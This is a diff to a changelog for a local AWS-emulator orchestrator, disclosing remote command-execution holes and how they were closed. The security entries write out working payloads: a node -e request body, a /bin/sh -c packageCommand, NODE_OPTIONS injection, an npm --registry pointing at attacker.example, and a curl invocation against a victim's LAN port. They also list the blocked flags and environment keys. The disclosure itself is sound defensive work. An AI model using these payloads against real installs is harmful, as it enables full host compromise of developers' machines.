@@ -135,15 +135,186 @@ resolved by ARN. Nothing the project supported on LocalStack needed LocalStack.
 - `lambdaRuntime.invokeHost` defaults to `127.0.0.1` (nothing runs in a container).
 - The dashboard, the CLI and every log line name the engine instead of LocalStack.
 
+### Security
+- **`POST /api/services/:name/start` was an arbitrary command runner — and it shipped.** This is not
+  a new-in-1.0 defect: the endpoint is present in **0.17.2 and every earlier release**, so any
+  install of those versions carries it. The handler read `command`, `args`, `cwd` and `env` straight
+  off the request body and passed them to `spawn()`; the only check was a four-entry command
+  allowlist that contained `node` and `npx`, and nothing at all validated the rest. So
+  `{"command":"node","args":["-e","<any JS>"],"cwd":"/"}` ran that JavaScript as the user running
+  the orchestrator, in any directory on the host, with an attacker-chosen environment — the classic
+  full-host compromise, not a sandbox escape. No caller ever sent those fields (the dashboard calls
+  `startService(name)` with no payload, and the CLI has no equivalent), so the whole input surface
+  was reachable only by an attacker. `args`, `cwd` and `env` are now **derived by the server**: a
+  start runs the registered service's own npm start script from the root recorded in that service's
+  cached metadata, and the command allowlist is package managers only — `node` and `npx` are gone,
+  since neither can express "run this service's start script" without also expressing "run this
+  arbitrary program". The request body no longer contributes argv, working directory or environment
+  at all, which is the only shape of this endpoint that is safe to expose on a port with no
+  authentication.
+- **The orchestrator was reachable by anything, from anywhere.** It bound every interface
+  (`listen(PORT)` with no host argument) and answered every origin with
+  `Access-Control-Allow-Origin: *`, with no authentication on any route. That turned the endpoint
+  above from "local privilege you already had" into two remote paths: anyone on the same LAN, VPN or
+  hotel Wi-Fi could POST to it directly, and **any web page you happened to visit** could do it from
+  your own browser — a simple JSON `POST` clears the permissive preflight, and the service name it
+  needs is served, unauthenticated and cross-origin, by `GET /api/services`. The listener now binds
+  **`127.0.0.1` by default**, and CORS defaults to loopback origins (`http://localhost`,
+  `http://127.0.0.1`, `http://[::1]`, any port — the Vite dev dashboard is the only cross-origin
+  caller a default install has), so a page on the internet gets no CORS headers and its preflight
+  fails before the real request is ever sent. Requests without an `Origin` — curl, the CLI,
+  `LssClient`, the MCP server, an AWS SDK — are not browser cross-origin requests and are
+  unaffected. Both halves are **deliberately widenable**, because a loopback-only stack would break
+  the layout LSS is actually used in — see the next bullet. Both are env-only by design:
+  `PUT /api/config` can set neither, because widening a boundary through the API it protects would
+  hand the exposure back to whoever already reached the API.
+- **New: `LSS_CORS_ORIGINS`, and `LSS_BIND_HOST` now means the whole process.** Hardening the
+  default is only half the job; the other half is that the safe default must have a documented way
+  out, or people paste `--disable-web-security` into a browser flag and everyone loses. The common
+  real layout is *LSS in a container, browser on the host, and the developer's own frontends calling
+  LSS directly* — inspecting queues, hitting the emulated API Gateway, invoking Lambdas. A loopback
+  bind refuses the published port, and a loopback-only origin list refuses the frontend. So the
+  opt-in is now **one coherent line** that turns network access on everywhere at once:
+  `LSS_BIND_HOST=0.0.0.0 LSS_CORS_ORIGINS='*' lss start` — or, better, with the origins named:
+  `LSS_CORS_ORIGINS=http://localhost:5173,http://192.168.1.20:5173`. `LSS_CORS_ORIGINS` takes a
+  comma-separated list of exact origins (case and trailing slash forgiven, since a hand-typed env
+  var that silently matches nothing is the worst failure mode for a knob whose job is to unblock a
+  frontend) or a single `*`; unset keeps the loopback default; setting it **replaces** that default
+  rather than extending it. `LSS_BIND_HOST` covers **every** listener the process opens — the
+  orchestrator, each service's API Gateway and Lambda Invoke API port, the split-listener engine and
+  the DynamoDB proxy — so widening is one decision, not four, and there is no half-open state where
+  the dashboard is fenced and the invoke ports are not. Boot prints a single warning naming whichever
+  knobs were widened and how to undo them; an explicit origin list prints nothing, because naming
+  your callers is the outcome the variable is trying to encourage. What widening costs is now a
+  bounded, statable thing: an unauthenticated API on the network, where callers can read and write
+  your local emulator data and read secret values out of the emulated Secrets Manager. The
+  arbitrary-binary paths are gone in this same release — `/start` derives argv, cwd and env
+  server-side, `/install` is shape- and flag-allowlisted, and `packageCommand`/`packageArgs` must
+  match the packaging grammar — so the residual is data exposure in a local dev stack rather than a
+  shell on the host. It is not zero: a caller who can reach the API can still ask the project's own
+  build to run (`npm run <script>`, `serverless package`), which is why "a network you trust"
+  remains the actual precondition, not a formality.
+- **`packageCommand`/`packageArgs` were an arbitrary binary with arbitrary argv, reachable through two unauthenticated calls.** The
+  `/start` and `/install` allowlists above closed two doors on the same room and left a third open.
+  `PUT /api/config` validated `packageCommand` as `{ kind: 'string' }` — non-empty, nothing else —
+  for the global key **and** for every `servicePackaging[*].packageCommand` override.
+  `getPackageConfigForService()` handed the value to `runServerlessPackage()`, which tokenises it
+  and calls `spawn(firstToken, restTokens)`. So
+  `PUT /api/config {"packageCommand":"/bin/sh","packageArgs":["-c","<anything>"]}` followed by one
+  `POST /api/services/package {"servicePath":"<any dir under the project root>"}` ran any binary
+  with any argv as the user running the orchestrator — the same class as the `/start` defect,
+  through a different door, which is exactly what made the other two allowlists worth nothing on
+  their own. `packageEnv` was the same hole in miniature:
+  `{"NODE_OPTIONS":"--require /tmp/x.js"}` injects code into an otherwise blameless
+  `npx serverless package`, because the runtime reads that variable before the program gets control.
+  **This is not new in 1.0.** The dedicated `POST /api/services/package` endpoint is (it ships in
+  this release), but the config plumbing behind it is not — verified against the released tree:
+  **0.17.2** carries the identical `packageCommand: { kind: 'string' }` validator (global *and*
+  `servicePackaging[*]`), the same `getPackageConfigForService()`, and the same
+  `runServerlessPackage()` → `spawn()`. The trigger there is `POST /api/services/register`, which
+  reaches that chain whenever the service's template is missing and `autoPackage` is on — and
+  `autoPackage` is itself a `PUT /api/config` key. So it is two unauthenticated calls on 0.17.2 too,
+  just with `register` in place of `package`. The `packageCommand` → `spawn()` path is older still
+  (it dates to the original `autoPackage` feature in 0.0.x); what made it *remotely* settable was
+  the Settings page adding an unauthenticated `PUT /api/config`. A `packageCommand` written through
+  that endpoint must now match a **grammar over the whole argv**, tokenized by the *same* tokenizer
+  the packager uses before `spawn()`, so the string that is checked is the string that runs:
+  `npm|yarn|pnpm run|run-script …`, `serverless|sls|osls package …`, or
+  `npx [-y] serverless|sls|osls[@version] package …`. A first-token allowlist was tried first and
+  **did not hold** — every runner on it is an interpreter one subcommand in, and
+  `spawn('npm', ['exec','-c','<shell string>'])` executes that string with no `shell: true`
+  anywhere, so `npm exec -c`, `npm x`, `npx -c`, `npx -y <pkg>`, `yarn dlx`, `pnpm dlx`,
+  `yarn exec`, `yarn node -e`, `yarn create`, `npm i <pkg>` and `yarn add <pkg>` (install scripts
+  run as you) all satisfied "the first token names a package manager" while running caller-chosen
+  code. Pinning the **subcommand** removes that class; a bare `yarn package` is rejected with it,
+  because yarn 1's implicit `run` is exactly what makes `yarn node -e '<js>'` indistinguishable
+  from a script name (write `yarn run package`). Every documented form still works
+  (`npx serverless package`, `npm run package:local`, `yarn run package`,
+  `serverless package --stage dev`, `sls package -c custom.yml`,
+  `npx -y serverless@3.38.0 package`); no allowed entry contains a path separator, so membership
+  alone still rejects `/bin/sh`, `bash`, `node`, `curl`, `/usr/bin/env` and `./tool`.
+  **`packageArgs` was the same hole one key across** — it was `stringArray`-validated (any string,
+  any count) and is appended to the argv *without* passing through the tokenizer, so
+  `{"packageCommand":"npm","packageArgs":["exec","-c","<shell>"]}` was the identical bypass. It is
+  now screened, per element and by index in the error, against the flags that re-point an allowed
+  program without changing a positional token — `--node-options` (NODE_OPTIONS under another name),
+  `--script-shell`/`--shell`/`--shell-mode` (which binary interprets the script), `--call`,
+  `--userconfig`/`--globalconfig`/`--use-yarnrc` (an rc file that can set all of the above),
+  `--registry` (npx fetches the CLI when the service has no local copy, and npm reads its own
+  config flags from anywhere in the argv), `--prefix`/`--cwd`/`--dir` (another package.json's
+  scripts) and node's own
+  `--require`/`--eval`/`--print`/`--import`/`--loader`/`--experimental-loader`/`--input-type`,
+  compared with dashes and underscores stripped so `--nodeOptions` is the same flag. The same
+  screen runs over every token of `packageCommand`. Serverless's short flags are deliberately left
+  alone (`-c`, `-p`, `-r` are `--config`, `--package`, `--region` there, and the grammar already
+  makes them unreachable as npm/npx options), so `sls package -c custom.yml -p .build` keeps
+  working. `packageEnv` (also
+  `envRecord`-validated now) rejects the keys that choose a binary before `main()` runs regardless of
+  which runner passed — `NODE_OPTIONS`, `NODE_REPL_EXTERNAL_MODULE`, `LD_PRELOAD`, `LD_AUDIT`,
+  `LD_LIBRARY_PATH`, `DYLD_INSERT_LIBRARIES`, `DYLD_LIBRARY_PATH` — compared case-insensitively,
+  since env lookup is case-insensitive on Windows and `node_options` would be the same bypass one
+  keystroke away. Per-service `servicePackaging[*]` overrides answer to both lists, since an override
+  is a different value for the same setting and not a way around its validation. **Two scoping
+  decisions, stated rather than implied.** The fence sits on the API and *not* on the read path: a
+  hand-edited `lss.config.json` and `LSS_PACKAGE_COMMAND` stay unchecked, because they are the
+  operator's own shell and anyone who can write either already runs code on this host. And what
+  stays expressible is the **project's own build**: `npm run <script>` runs whatever the service's
+  `package.json` declares, and `serverless package` reads its `serverless.yml`, plugins included.
+  That is code the operator already trusts by pointing LSS at the directory, and forbidding it
+  would mean the dashboard could not set a package command at all, which is what the onboarding
+  flow is built on. What the fence buys is the drop from "any binary on the host with any argv" to
+  "the project's own build, and nothing the caller names".
+- **The loopback bind now covers the listeners that mattered most.** Fencing `index.ts` alone left
+  the sharper half of the surface untouched, because LSS opens four kinds of listener and only one
+  of them read `LSS_BIND_HOST`. `services/gateway-manager.ts` called `server.listen(port)` with no
+  host for **every registered service's API Gateway port and Lambda Invoke API port**; a bare
+  `listen(port)` binds the `::` wildcard, so those ports answered on every interface while the
+  dashboard sat on loopback. They are raw `http.Server`s that never reach Express — no CORS, no
+  origin check — and the invoke handler executes a registered Lambda handler with the request's
+  JSON body as its event, resolving the function through the **global** registry, so a single
+  `curl -X POST http://<victim>:13001/2015-03-31/functions/<fn>/invocations` from anywhere on the
+  LAN ran any function of any service. `engine/backends/self-backend.ts` asked for `'0.0.0.0'`
+  outright, publishing the whole unauthenticated AWS data plane (Scan/PutItem, ReceiveMessage,
+  GetObject, GetSecretValue) whenever `serverPort` and `selfEngine.port` differed, and
+  `dev/dynamo-proxy.ts` did the same for its credential-free DynamoDB pass-through. All four now
+  read one value, resolved once in **`src/server/services/bind-host.ts`** — captured at module
+  load so listeners opened at boot and listeners opened on a hot reload an hour later cannot
+  disagree about how exposed the process is — and the boot warning names the full set it just
+  put on the network. Regression tests assert the **bound address of real listeners** for all four
+  (`tests/unit/routes/services.test.ts`, `tests/unit/dev/dynamo-proxy.test.ts`), and replay the
+  LAN-side payload where the host has an interface to replay it on.
+
 ### Fixed
-- **The preparation endpoints could not become a general command runner.** Found in review before
-  release: `POST /api/services/install` accepted any absolute directory and any command whose first
-  whitespace token was whitelisted — but `node -e "<js>"` and `npm exec -- <anything>` pass such a
-  check, and the endpoint answers with the command's output, which would have made it an execution
-  *and* exfiltration primitive for anything able to reach the port (the server binds all interfaces
-  with permissive CORS). Both endpoints now confine `servicePath` to the project root, and the
-  install command is validated by **shape** — package manager + install verb + flags only, no
-  positionals — so those forms are unrepresentable rather than merely discouraged.
+- **The preparation endpoints could not become a general command runner.** Unlike `/start` above,
+  `POST /api/services/install` and `POST /api/services/package` are **new in 1.0** — they were caught
+  in review, so no released version ever exposed *them*. That is a statement about these two
+  endpoints only: the execution surface itself was not new, it shipped as `/start`, and the "found
+  before release" framing previously here understated that. `/install` accepted any absolute
+  directory and any command whose first whitespace token was whitelisted — but `node -e "<js>"` and
+  `npm exec -- <anything>` pass such a check, and the endpoint answers with the command's output,
+  which would have made it an execution *and* exfiltration primitive for anything able to reach the
+  port. Both endpoints now confine `servicePath` to the project root, and the install command is
+  validated by **shape** — package manager + install verb + flags, no positionals — so those forms
+  are unrepresentable rather than merely discouraged; which flags may appear is the next bullet.
+- **The install command's shape check was not sufficient on its own.** Requiring every token after
+  the verb to start with `-` treats flags as inert, and they are not: `npm install
+  --registry=http://attacker.example` installs that registry's packages and runs their `postinstall`
+  scripts, `--userconfig=` points npm at an attacker-written `.npmrc`, and `--prefix=` / `yarn
+  --cwd=` / `pnpm --dir=` relocate the install *out of* the directory the project-root fence just
+  vetted. Flags are now checked against an **allowlist** of the ones a dependency install
+  legitimately needs (`--production`, the lockfile spellings, `--no-audit`/`--no-fund`,
+  `--prefer-offline`/`--offline`, `--legacy-peer-deps`, `--force`, `--silent`/`--quiet`, plus
+  `--omit=`/`--include=`/`--loglevel=` whose values can only name a dependency group or a log level).
+  Anything else — an unknown flag, a short flag, a space-separated value — is a 400. A deny-list
+  could not close this class: three package managers keep adding flags, and every new one would be
+  permitted by default.
+- **The project-root fence was lexical, so a symlink walked straight through it.** `/install` and
+  `/package` compared `path.relative(projectRoot, path.resolve(servicePath))` — pure string work —
+  while `statSync` and the spawn that followed resolve symlinks. A link inside the project root
+  pointing outside it (`services/orders → /etc`) therefore passed a check that was about the
+  spelling of the path rather than about where it lands. Both sides are now `realpathSync`-resolved
+  before the comparison, and the resolved real path is what the command runs in, which also narrows
+  the check-to-spawn window.
 - **Per-service overrides were unreachable when the config file was not in the project root.** The
   key the dashboard writes is project-root relative (from the scan), while `getRuntimeConfigForService`
   / `getPackageConfigForService` matched a raw `dirname(configPath)`-relative one. With a checkout
